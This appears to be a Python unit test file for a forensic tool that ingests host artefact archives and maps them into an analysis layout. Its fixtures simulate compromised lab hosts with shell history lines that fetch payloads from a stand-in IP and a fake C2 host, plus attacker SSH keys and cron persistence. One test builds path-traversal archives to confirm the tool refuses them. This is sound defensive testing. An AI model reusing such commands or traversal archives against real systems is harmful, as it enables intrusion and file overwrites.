"""Gandalf source node: archives become <output>/<host>/artefacts/raw/ in Elrond's layout.

Run: python3 -m unittest tests/unit/test_gandalf_ingest.py
"""
import io
import os
import sys
import tarfile
import tempfile
import unittest
import zipfile
from pathlib import Path

# Appended, not prepended: src/analysis/platform would shadow the stdlib module.
sys.path.append(str(Path(__file__).resolve().parents[2] / "src" / "analysis"))

from rowanholt.core import gandalf  # noqa: E402
from rowanholt.core.identify import parse_gandalf_host_info  # noqa: E402

UNIX_LAYOUT = {
    "artefacts/host.info": "lab-rocky::Linux\nLinux lab-rocky 7.0\n",
    "artefacts/process.info": "ps",
    "artefacts/etc+passwd": "root:x:0:0",
    "artefacts/etc+group": "root:x:0:",
    "artefacts/logs/auth.log": "Failed password from 198.51.100.77",
    "artefacts/logs/journal/abc/system.journal": "j",
    "artefacts/conf/system+lab-sync.service": "[Service]",
    "artefacts/cron/etc+crontab": "* * * * * root x",
    "artefacts/cron/lab-update": "*/5 * * * * root y",
    "artefacts/user/gandalf/.bash_history": "wget http://198.51.100.23/x",
    "artefacts/user/gandalf/ssh/authorized_keys": "ssh-ed25519 AAAA attacker@rivendell-lab.test",
    "log.audit": "audit",
}

MACOS_LAYOUT = {
    "artefacts/host.info": "lab-macos::macOS\nDarwin lab-macos 24.6.0\n",
    "artefacts/lsof.info": "lsof",
    "artefacts/etc+passwd": "nobody:*:-2:-2",
    "artefacts/logs/install.log": "Installer",
    "artefacts/logs_library/DiagnosticReports+x.ips": "crash",
    "artefacts/logs_security/audit_control": "flags:lo,aa",
    "artefacts/plists/launchagents+com.rivendell-lab.update.plist": "<plist/>",
    "artefacts/plists/gandalf+launchagents+com.evil.plist": "<plist/>",
    "artefacts/cron/gandalf+crontab": "@reboot /Users/Shared/.x/update.sh",
    "artefacts/user/gandalf/.zsh_history": ": 1792800010:0;curl http://198.51.100.23:8080/m.sh",
    "artefacts/user/gandalf/QuarantineEventsV2": "sqlite",
    "artefacts/browsers/safari/gandalf/gandalf+History.db": "sqlite",
    "artefacts/browsers/chrome/gandalf+History": "sqlite",
    "artefacts/tcc/system+TCC.db": "sqlite",
    "artefacts/shared/.x+update.sh": "echo curl http://c2.rivendell-lab.test/next",
}


def write_tarball(path, files, extra=None):
    with tarfile.open(path, "w:gz") as tar:
        root = tarfile.TarInfo(".")  # gandalf.sh archives start with ./
        root.type = tarfile.DIRTYPE
        tar.addfile(root)
        for name, body in files.items():
            data = body.encode()
            info = tarfile.TarInfo("./" + name)
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
        for info, data in extra or []:
            tar.addfile(info, io.BytesIO(data))


class GandalfIngestTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        self.acq = self.root / "bash_collection" / "acquisitions"
        self.out = self.root / "out"
        self.out.mkdir()

    def tearDown(self):
        self.tmp.cleanup()

    def assess(self):
        allimgs = {}
        gandalf.assess_gandalf(False, True, False, False, False, False, {}, str(self.acq) + "/", os.getcwd(),
                               False, [], str(self.out) + "/", "", allimgs, {}, "", False, False)
        return allimgs

    def test_macos_layout_maps_to_elrond_raw(self):
        (self.acq / "lab-macos").mkdir(parents=True)
        write_tarball(self.acq / "lab-macos" / "lab-macos.tar.gz", MACOS_LAYOUT)
        allimgs = self.assess()

        raw = self.out / "lab-macos" / "artefacts" / "raw"
        self.assertEqual(allimgs, {str(raw): "lab-macos::macOS"})
        for rel in ("passwd", "logs/var+install.log", "logs/library+DiagnosticReports+x.ips",
                    "logs/security+audit_control", "plists/launchagents+com.rivendell-lab.update.plist",
                    "plists/gandalf+launchagents+com.evil.plist", "cron/gandalf+crontab",
                    "user_profiles/gandalf+zsh_history", "user_profiles/gandalf+QuarantineEventsV2",
                    "browsers/gandalf/safari/History.db", "browsers/gandalf/chrome/History",
                    "tcc/system+TCC.db", "shared/.x+update.sh"):
            self.assertTrue((raw / rel).is_file(), rel)
        self.assertFalse((raw / "crontab").exists(), "a user's crontab isn't the system crontab")
        self.assertTrue((self.out / "lab-macos" / "artefacts" / "lsof.info").is_file())

    def test_manifest_checked_on_arrival(self):
        import csv
        import hashlib

        files = dict(UNIX_LAYOUT)
        files["artefacts/user/gandalf/.bash_history"] = "tampered after hashing"
        rows = [["hostname", "file_path", "sha256_hash"]]
        for name, body in UNIX_LAYOUT.items():
            rows.append(["lab-rocky", name, hashlib.sha256(body.encode()).hexdigest()])
        rows.append(["lab-rocky", "artefacts/gone,with a comma", "0" * 64])
        manifest = io.StringIO()
        csv.writer(manifest).writerows(rows)
        files["log.meta"] = manifest.getvalue()
        (self.acq / "lab-rocky").mkdir(parents=True)
        write_tarball(self.acq / "lab-rocky" / "lab-rocky.tar.gz", files)
        self.assess()

        with open(self.out / "lab-rocky" / "gandalf_integrity.csv", newline="") as f:
            status = {row["file_path"]: row["status"] for row in csv.DictReader(f)}
        self.assertEqual(status["artefacts/etc+passwd"], "verified")
        self.assertEqual(status["artefacts/user/gandalf/.bash_history"], "MISMATCH")
        self.assertEqual(status["artefacts/gone,with a comma"], "missing")
        self.assertEqual(list(status.values()).count("verified"), len(UNIX_LAYOUT) - 1)

    def test_manifest_with_source_paths_is_not_checked(self):
        files = dict(UNIX_LAYOUT, **{"log.meta": "hostname,file_path,sha256_hash\nlab-rocky,/etc/passwd," + "a" * 64 + "\n"})
        (self.acq / "lab-rocky").mkdir(parents=True)
        write_tarball(self.acq / "lab-rocky" / "lab-rocky.tar.gz", files)
        self.assess()
        self.assertFalse((self.out / "lab-rocky" / "gandalf_integrity.csv").exists())

    def test_zsh_extended_history(self):
        from rowanholt.process.nix import parse_zsh_history

        entries = parse_zsh_history(": 1792800000:0;whoami\nplain\n: 1792800020:3;echo a \\\nb\n")
        self.assertEqual(entries, [("2026-10-24T00:00:00Z", "whoami"), ("", "plain"),
                                   ("2026-10-24T00:00:20Z", "echo a \\\nb")])

    def test_unix_layout_maps_to_elrond_raw(self):
        (self.acq / "lab-rocky").mkdir(parents=True)
        write_tarball(self.acq / "lab-rocky" / "lab-rocky.tar.gz", UNIX_LAYOUT)
        allimgs = self.assess()

        raw = self.out / "lab-rocky" / "artefacts" / "raw"
        self.assertEqual(allimgs, {str(raw): "lab-rocky::Linux"})
        for rel in ("passwd", "group", "crontab", "cron/lab-update", "logs/var+auth.log",
                    "journal/abc/system.journal", "conf/system+lab-sync.service",
                    "user_profiles/gandalf+bash_history", "user_profiles/gandalf+authorized_keys"):
            self.assertTrue((raw / rel).is_file(), rel)
        self.assertTrue((self.out / "lab-rocky" / "artefacts" / "process.info").is_file())
        self.assertTrue((self.out / "lab-rocky" / "gandalf_log.audit").is_file())
        self.assertFalse((self.out / gandalf.STAGING_DIR).exists())

    def test_zip_names_and_two_zips_in_one_folder(self):
        # E19: names lose only their extension (not a character set), and a second zip is fine
        self.assertEqual(gandalf.archive_stem("zipper.zip"), "zipper")
        self.assertEqual(gandalf.archive_stem("lab-rocky.tar.gz"), "lab-rocky")
        (self.acq / "hosts").mkdir(parents=True)
        for host in ("zipper", "pizza"):
            with zipfile.ZipFile(self.acq / "hosts" / f"{host}.zip", "w") as z:
                z.writestr("artefacts/host.info", f"{host}::Linux\n")
                z.writestr("artefacts/etc+passwd", "root:x:0:0")
        self.assertEqual(sorted(v for v in self.assess().values()), ["pizza::Linux", "zipper::Linux"])

    def test_memory_dumps_from_every_collector_are_found(self):
        # E23: AVML's .mem (gandalf.sh, gandalf.py), osxpmem's mem.raw (not its .aff4 when the
        # raw is there), DumpIt's raw/memory/<host>.raw; small files and other .raw files aren't
        def dump(rel, size=gandalf.MIN_MEMORY_DUMP):
            path = self.out / rel
            path.parent.mkdir(parents=True, exist_ok=True)
            with open(path, "wb") as fh:
                fh.truncate(size)  # sparse
            return str(path)

        expected = {dump("lab-rocky/artefacts/raw/memory/lab-rocky.mem"),
                    dump("lab-ubuntu/artefacts/raw/lab-ubuntu.mem"),
                    dump("lab-macos/artefacts/raw/mem.raw"),
                    dump("WIN11/artefacts/raw/memory/WIN11.raw")}
        dump("lab-macos/artefacts/raw/mem.aff4")                  # mem.raw is used instead
        dump("lab-ubuntu/artefacts/raw/partial.mem", size=1024)   # a failed dump
        dump("WIN11/artefacts/raw/registry/disk.raw")             # not memory
        self.assertEqual(set(gandalf.gandalf_memory_dumps(str(self.out))), expected)

    def test_aff4_is_used_when_there_is_no_raw(self):
        path = self.out / "lab-macos" / "artefacts" / "raw" / "mem.aff4"
        path.parent.mkdir(parents=True)
        with open(path, "wb") as fh:
            fh.truncate(gandalf.MIN_MEMORY_DUMP)
        self.assertEqual(gandalf.gandalf_memory_dumps(str(self.out)), [str(path)])

    def test_windows_zip_already_in_elrond_layout(self):
        (self.acq / "WIN11").mkdir(parents=True)
        with zipfile.ZipFile(self.acq / "WIN11" / "WIN11.zip", "w") as z:
            z.writestr("artefacts\\artefacts\\host.info", "WIN11::Windows10\n")
            z.writestr("artefacts\\artefacts\\processes.csv", "Name\n")
            z.writestr("artefacts\\artefacts\\raw\\registry\\SYSTEM", "regf")
            z.writestr("artefacts\\artefacts\\raw\\evt\\Security.evtx", "ElfFile")
        allimgs = self.assess()

        art = self.out / "WIN11" / "artefacts"
        self.assertEqual(allimgs, {str(art / "raw"): "WIN11::Windows10"})
        self.assertTrue((art / "raw" / "registry" / "SYSTEM").is_file())
        self.assertTrue((art / "raw" / "evt" / "Security.evtx").is_file())
        self.assertTrue((art / "processes.csv").is_file())
        self.assertFalse((self.root / "escaped.txt").exists())

    def test_hostile_and_unreadable_archives(self):
        (self.acq / "bad").mkdir(parents=True)
        escape = tarfile.TarInfo("../../escaped.txt")
        escape.size = 1
        write_tarball(self.acq / "bad" / "bad.tar.gz", {"artefacts/host.info": "bad::Linux\n"}, [(escape, b"x")])
        (self.acq / "evil").mkdir(parents=True)
        with zipfile.ZipFile(self.acq / "evil" / "evil.zip", "w") as z:
            z.writestr("artefacts\\host.info", "evil::Linux\n")
            z.writestr("..\\..\\escaped.txt", "x")
        (self.acq / "bad" / "broken.zip").write_bytes(b"not a zip")
        (self.acq / "bad" / "._bad.tar.gz").write_bytes(b"\x00\x05")
        (self.acq / "good").mkdir(parents=True)
        write_tarball(self.acq / "good" / "good.tar.gz", {"artefacts/host.info": "good::Linux\n", "artefacts/etc+passwd": "x"})
        allimgs = self.assess()

        # Tampered archives are refused whole; unreadable ones are skipped; the rest still ingest.
        self.assertEqual(list(allimgs.values()), ["good::Linux"])
        self.assertFalse((self.root / "escaped.txt").exists())
        self.assertFalse((self.root.parent / "escaped.txt").exists())

    def test_reingest_reuses_existing_output(self):
        (self.acq / "lab-rocky").mkdir(parents=True)
        write_tarball(self.acq / "lab-rocky" / "lab-rocky.tar.gz", UNIX_LAYOUT)
        self.assess()
        cooked = self.out / "lab-rocky" / "artefacts" / "cooked"
        cooked.mkdir()
        (cooked / "kept.csv").write_text("x")
        self.assess()
        self.assertTrue((cooked / "kept.csv").exists())
        self.assertFalse((self.out / "lab-rocky" / "artefacts" / "raw" / "passwd.1").exists())

    def test_host_info_formats(self):
        self.assertEqual(parse_gandalf_host_info("h::Linux"), ("h", "Linux"))
        self.assertEqual(parse_gandalf_host_info("Linux h 7.0 #1 SMP aarch64"), ("h", "Linux"))
        self.assertEqual(parse_gandalf_host_info("Darwin m 25.0.0"), ("m", "macOS"))
        self.assertEqual(parse_gandalf_host_info("uname_result(system='Linux', node='h', release='7')"), ("h", "Linux"))


if __name__ == "__main__":
    unittest.main()
